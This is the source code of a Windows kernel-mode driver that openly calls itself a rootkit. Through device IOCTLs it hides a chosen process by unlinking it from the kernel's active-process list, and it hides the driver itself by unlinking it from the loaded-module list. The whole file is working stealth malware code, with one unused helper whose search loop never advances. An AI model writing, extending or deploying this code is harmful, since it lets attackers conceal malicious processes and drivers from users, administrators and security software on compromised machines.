#include <ntddk.h>
#include "Header.h"
#include "DriverHeader.h"

EXTERN_C_START
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING);

NTSTATUS RKCreateClose(
	PDEVICE_OBJECT DeviceObject,
	PIRP Irp
);

NTSTATUS RKReadWrite(
	PDEVICE_OBJECT DeviceObject,
	PIRP Irp
);

NTSTATUS RKDeviceControl(
	PDEVICE_OBJECT DeviceObject,
	PIRP Irp
);

VOID RKUnload(
	PDRIVER_OBJECT DriverObject
);

// our main functionality.
NTSTATUS RKHideProcess(
	 _In_ UINT32 PID
);

NTSTATUS RKHideDriver(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING TargetDriverPath
);

// remove the process from the process table..
VOID RKModifyProcessLinks(
	 UINT64 eprocess,
	 UINT64 listEntryOffset
);

VOID RKModifyDriverLinks(
	_In_ PKLDR_DATA_TABLE_ENTRY pCurrentDataTableEntry
);

EXTERN_C_END


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	NTSTATUS status;
	UNICODE_STRING SymLinkName, DeviceName;
	PDEVICE_OBJECT DeviceObject;
	PKLDR_DATA_TABLE_ENTRY tableEntry = NULL;

	RtlInitUnicodeString(&SymLinkName, L"\\??\\RootKitSym");
	RtlInitUnicodeString(&DeviceName, L"\\Device\\RootKitDevice");


	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = RKCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = RKDeviceControl;
	DriverObject->MajorFunction[IRP_MJ_READ] = DriverObject->MajorFunction[IRP_MJ_WRITE] = RKReadWrite;
	DriverObject->DriverUnload = RKUnload;
	
	tableEntry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;

	if (tableEntry == NULL)
	{
		KdPrint(("[--] error while getting the module entry."));
	}
	else
	{
		KdPrint(("[+] the address of module entry is : %x", tableEntry));
		if (tableEntry->FullDllName.Buffer != NULL)
		{
			KdPrint(("[+++] the drive FULL DLLL NAME is: %wZ", tableEntry->FullDllName));
			KdPrint(("[+++] & Driver Base Dll Name is: %wZ", tableEntry->BaseDllName));
			KdPrint(("[+++] lastly the driver name from driver object is : %wZ", DriverObject->DriverName));
		}
		else
		{
			KdPrint(("[---] error while getting the driver name from module entry."));
		}
	}


	status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_UNKNOWN, NULL, FALSE, &DeviceObject);

	if(!NT_SUCCESS(status))
	{
		KdPrint(("[ROOTKIT] ERROR: While Creating a Device. error code : %d", status));
		return status;
	}

	status = IoCreateSymbolicLink(&SymLinkName, &DeviceName);
	
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[ROOTKIT] ERROR: While Creating a symbolic link. error code : %d", status));
		IoDeleteDevice(DeviceObject);
		return status;
	}

	return status;
}

NTSTATUS RKCreateClose(
	PDEVICE_OBJECT DeviceObject,
	PIRP Irp
)
{
	// just ignore...
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS RKReadWrite(
	PDEVICE_OBJECT DeviceObject,
	PIRP Irp
)
{
	// just ignore AGAIN ...
	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS RKDeviceControl(
	PDEVICE_OBJECT DeviceObject,
	PIRP Irp
)
{
	UNREFERENCED_PARAMETER(DeviceObject);

	PIO_STACK_LOCATION irpStackLocation = NULL;
	PDATA_FROM_USER dataBuffer = NULL;
	DATA_TO_USER dataBufferToUser = { 0 };
	NTSTATUS status;
	PKLDR_DATA_TABLE_ENTRY pDataTableEntry = NULL;
	// now here's the real work..
	// we should receive a PID..

	irpStackLocation = IoGetCurrentIrpStackLocation(Irp);

	switch (irpStackLocation->Parameters.DeviceIoControl.IoControlCode)
	{
	
	case RK_CTL_PROCESS_HIDE:
		// LET'S CHECK THE BUFFER SIZE..
		if (irpStackLocation->Parameters.DeviceIoControl.InputBufferLength < DATA_FROM_USER_SIZE)
		{
			KdPrint(("[ROOTKIT] ERROR: the size came from user for buffer is small."));

		}
		else
		{
			// now we have the PID..
			dataBuffer = (PDATA_FROM_USER)Irp->AssociatedIrp.SystemBuffer;

			if (dataBuffer->PID == 0)
			{
				KdPrint(("[ROOTKIT] ERROR: the PID that was passed is 0."));
				goto SENDTOUSER;
			}
			KdPrint(("[ROOTKIT] SUCCESS: the user PID is %d", dataBuffer->PID));

			status = RKHideProcess(dataBuffer->PID);

			if (status == STATUS_SUCCESS)
			{
				KdPrint(("[ROOTKIT] SUCCESS: the process is now hidden..."));

				dataBufferToUser.IsProcessHidden = TRUE;
			}
			else
			{
				KdPrint(("[ROOTKIT] ERROR: the process isn't hidden."));
				dataBufferToUser.IsProcessHidden = FALSE;
			}


		}

SENDTOUSER:
		// now let's send the data back to user..
		if (irpStackLocation->Parameters.DeviceIoControl.OutputBufferLength < DATA_TO_USER_SIZE)
		{
			KdPrint(("[ROOTKIT] ERROR: the size of output buffer is small.."));
			Irp->IoStatus.Information = 0;
		}
		else
		{
			RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, &dataBufferToUser, DATA_TO_USER_SIZE);
			Irp->IoStatus.Information = DATA_TO_USER_SIZE;
		}
		
		break;

	case RK_CTL_DRIVER_HIDE:
		// here I don't care much about the input data, my target is only to hide this driver not other drivers,
		// :: maybe in the future I will add this utility to hide other drivers.
		pDataTableEntry = static_cast<PKLDR_DATA_TABLE_ENTRY>(DeviceObject->DriverObject->DriverSection);

		RKModifyDriverLinks(pDataTableEntry);
		KdPrint(("[+] Now your driver is hidden.\n"));

		break;

	default:
		break;
	}

	Irp->IoStatus.Status = STATUS_SUCCESS;
	
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}



VOID RKUnload(
	PDRIVER_OBJECT DriverObject
)
{
	UNICODE_STRING symLinkName;

	RtlInitUnicodeString(&symLinkName, L"\\??\\RootKitSym");

	IoDeleteSymbolicLink(&symLinkName);

	IoDeleteDevice(DriverObject->DeviceObject);
}

NTSTATUS RKHideProcess(
	 UINT32 PID
)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	UINT64 eprocess = 0x00000000; // this will hold the address to EPROCESS.
	PLIST_ENTRY pProcessesListEntry = NULL;
	UINT32 currentProcessId = 0, savedProcessId;
	int counter = 0;

	
	// first thing first, let's get our process _EPROCESS address..
	eprocess = (UINT64) PsGetCurrentProcess();

	// now since we are inside the structure, let's play with some offsets
	// first we get the PID..
	
	currentProcessId = *((UINT32*)(eprocess + UniqueProcessIdOffset));
	
	KdPrint(("[ROOTKIT] the PID of the process running this code is : %d", currentProcessId));

	// just to know if we couldn't find the process..
	savedProcessId = currentProcessId;

	// now we should compare 
	while (currentProcessId != PID)
	{
		if (savedProcessId == currentProcessId && counter > 0)
		{
			// then we now iterated full iterate, so we can't find it..
			eprocess = 0x0;
			break;
		}

		// now let's get the next process..
		pProcessesListEntry = (PLIST_ENTRY)(eprocess + ActiveProcessLinksOffset);

		// now we got a pointer to the current process LIST_ENTRY, 
		// let's get the FLINK member VALUE itself from it that points to the next processsss..
		pProcessesListEntry = pProcessesListEntry->Flink;

		// now we have the LIST_ENTRY offset to the next process, 
		// let's just now return back to the start address of eprocess itself..
		eprocess = (UINT64)((UINT64)pProcessesListEntry - ActiveProcessLinksOffset);

		// now let's get the PID value..

		currentProcessId = *((UINT32*)(eprocess + UniqueProcessIdOffset));

		// and let the loop do the rest for us..
		counter++;
	}

	//
	// if we are out, then it's only one option of those happened:
	// 1- we iterates across all processes and we haven't found any
	// 2- we found the eprocess for the wanted process
	// 3- the current process itself that runs this kernel code is the process we are looking for.
	// 

	// option 1:
	if (eprocess == 0x0)
	{
		KdPrint(("[ROOTKIT] Sorry, iterated across all possible EPROCESS (%d processes) and couldn't find you.", counter));
		status = STATUS_NOT_FOUND;
	}
	else
	{
		// option 2 or 3
		KdPrint(("[ROOTKIT] CONGRATS: we found the EPROCESS for you PID.."));
		KdPrint(("[ROOTKIT] NOW trying to remove it from the table.."));

		// let's remove it from the table ..
		RKModifyProcessLinks(eprocess, ActiveProcessLinksOffset);
		
		KdPrint(("[ROOTKIT] BOOM, your process now with PID %d should be hidden now.", PID));

		status = STATUS_SUCCESS;
	}

	return status;
}

VOID RKModifyProcessLinks(
	 UINT64 eprocess,
	 UINT64 listEntryOffset
)
{
	PLIST_ENTRY pCurrentProcessListEntry = NULL;
	PLIST_ENTRY pOtherProcessListEntry = NULL;

	// now let's just modify the LIST_ENTRY of it and for its neighbors
	pCurrentProcessListEntry  = (PLIST_ENTRY)(eprocess + listEntryOffset);

	// let's modify the previous process..
	pOtherProcessListEntry = pCurrentProcessListEntry->Blink;

	pOtherProcessListEntry->Flink = pCurrentProcessListEntry->Flink;

	// and the process after ..
	pOtherProcessListEntry = pCurrentProcessListEntry->Flink;
	
	pOtherProcessListEntry->Blink = pCurrentProcessListEntry->Blink;

	// now let's modify our process.. (MAKE THEM BOTH POINTS TO THE START ADDRESS OF THE LIST_ENTRY)
	pCurrentProcessListEntry->Flink = (PLIST_ENTRY) & (pCurrentProcessListEntry->Flink);
	pCurrentProcessListEntry->Blink = (PLIST_ENTRY) & (pCurrentProcessListEntry->Flink);

}

NTSTATUS RKHideDriver(
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING TargetDriverPath

)
{
	PKLDR_DATA_TABLE_ENTRY pDataTabeEntry = NULL, pCurrentTableEntry = NULL;
	// first let's check whether we have a valid pointer.
	if (DriverObject == NULL || TargetDriverPath == NULL)
		return STATUS_INVALID_ADDRESS;

	// NOWWW LET'S GET INTO WORK:
	pDataTabeEntry = static_cast<PKLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);

	pCurrentTableEntry = pDataTabeEntry;

	while (pCurrentTableEntry->InLoadOrderLinks.Flink != &pDataTabeEntry->InLoadOrderLinks)
	{
		if (pCurrentTableEntry->FullDllName.Length != 0)
		{
			if (RtlCompareUnicodeString(TargetDriverPath, &pCurrentTableEntry->FullDllName, FALSE) == 0)
			{
				// now we found it, let's modify the structure..
				RKModifyDriverLinks(pCurrentTableEntry);
				KdPrint(("[+] YOUR TARGET ROOTKIT IS HIDDEN NOW.\n"));
				break;

			}
		}
	}

	return STATUS_SUCCESS;

}

VOID RKModifyDriverLinks(
	_In_ PKLDR_DATA_TABLE_ENTRY pCurrentDataTableEntry
)
{
	PLIST_ENTRY pTempListEntry = NULL;

	// the previous one
	pTempListEntry = pCurrentDataTableEntry->InLoadOrderLinks.Blink;
	pTempListEntry->Flink = pCurrentDataTableEntry->InLoadOrderLinks.Flink;

	// the forward one
	pTempListEntry = pCurrentDataTableEntry->InLoadOrderLinks.Flink;
	pTempListEntry->Blink = pCurrentDataTableEntry->InLoadOrderLinks.Blink;

	//  modify our LIST_ENTRY structure againn.
	pCurrentDataTableEntry->InLoadOrderLinks.Flink = (PLIST_ENTRY) & (pCurrentDataTableEntry->InLoadOrderLinks.Flink);
	pCurrentDataTableEntry->InLoadOrderLinks.Blink = (PLIST_ENTRY) & (pCurrentDataTableEntry->InLoadOrderLinks.Flink);
}